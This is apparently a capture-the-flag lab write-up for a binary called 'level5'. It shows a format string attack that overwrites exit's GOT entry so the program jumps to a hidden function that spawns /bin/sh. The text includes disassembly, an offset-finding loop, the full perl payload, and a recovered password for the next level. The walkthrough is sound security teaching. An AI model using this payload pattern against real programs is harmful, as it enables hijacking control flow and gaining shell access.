# level5

```bash
> objdump -d level5
...
080484a4 <o>:
 80484a4:	55                   	push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	83 ec 18             	sub    $0x18,%esp
 80484aa:	c7 04 24 f0 85 04 08 	movl   $0x80485f0,(%esp)
 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
 80484b6:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>
...
```
```c
void	o() {
	system("/bin/sh");
}
```
> view the `Ressources/main.asm` and `source` files for the disasembly part

Interesting we can see a function `o` that is never called, let's try to call it.

---

we can see the address of `o` in the objdump output: `0x080484a4`

Or using gdb:
```
(gdb) disass o
...
0x080484a4 <- this is the address of o
...
```
```
(gdb) p o
$2 = {<text variable, no debug info>} 0x080484a4 <o>
```

---

After `printf` the `exit` function from stdlib is called
```c
{
	...
	printf(str);
	exit(1);
}
```

We will change the `exit` GOT entry to point to the `o` function instead
```
080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    *0x8049838
 80483d6:	68 28 00 00 00       	push   $0x28
 80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>
```

The GOT entry of exit is `0x8049838`


---

Ok so we have to replace the value in `0x08049838` (exit) to `0x080484a4` (o).

We can do this using printf.
> https://www.exploit-db.com/papers/23985

Let's determine the offset at which the first printf arg begin.
```bash
> for i in {0..100}; do echo "Index: $i" && echo "****%$i\$x" | ./level5 ; done | grep -B1 2a2a
Index: 4
****2a2a2a2a
```

We can write any value we want at the exit address with this line
```bash
> ./level5 < <(perl -e 'print "\x38\x98\x04\x08" . "%4\$hn"')
# exit address is 0x08040004
# we only write on the 2 last bytes
```

---

We only need to replace the last 2 bytes (the first 2 bytes in exit call are already `0x0804`).

`0x84a4`:
- 0x84a4 - 4 = 33952

```bash
> ./level5 < <(perl -e 'print "\x38\x98\x04\x08" . "%33952x" . "%4\$hn"')
```
Ok no segfault now.

---

full exploit

```bash
> (perl -e 'print "\x38\x98\x04\x08" . "%33952x" . "%4\$hn"'; cat) | ./level5
...
(level6) > cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
